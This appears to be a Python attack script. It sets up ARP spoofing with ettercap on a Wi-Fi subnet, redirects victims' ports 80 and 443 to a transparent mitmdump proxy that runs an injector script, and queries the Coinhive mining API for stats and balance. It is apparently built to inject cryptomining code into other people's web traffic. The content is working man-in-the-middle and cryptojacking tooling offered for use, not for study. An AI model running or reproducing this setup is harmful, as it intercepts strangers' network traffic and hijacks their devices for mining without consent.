#!/usr/bin/env python3
from OpenSSL import crypto
import json
import requests
import os
import sys

def ip_forward():
    os.system("sysctl -w net.ipv4.ip_forward=1")
    return True

def config_ettercap():
    os.system("ettercap -TqP autoadd -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//")
    return True

def config_iptables():
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
    return True
    
def injector():
    os.system("mitmdump --mode transparent -s injector2.py")
    return True

def get_stats(secret_key, params={}):
    headers = {
        "User-Agent": "bytexmen@mail.com",
        "Content-Type": "application/json"
    }
    params.update(secret=secret_key)
    return requests.get("https://api.coinhive.com/stats/site", params=params, headers=headers).json()

def get_balance(secret_key, params={}):
    headers = {
        "User-Agent": "bytexmen@mail.com",
        "Content-Type": "application/json"
    }
    params.update(secret=secret_key)
    params.update(name="bytexmen@mail.com")
    return requests.get("https://api.coinhive.com/user/balance", params=params, headers=headers).json()
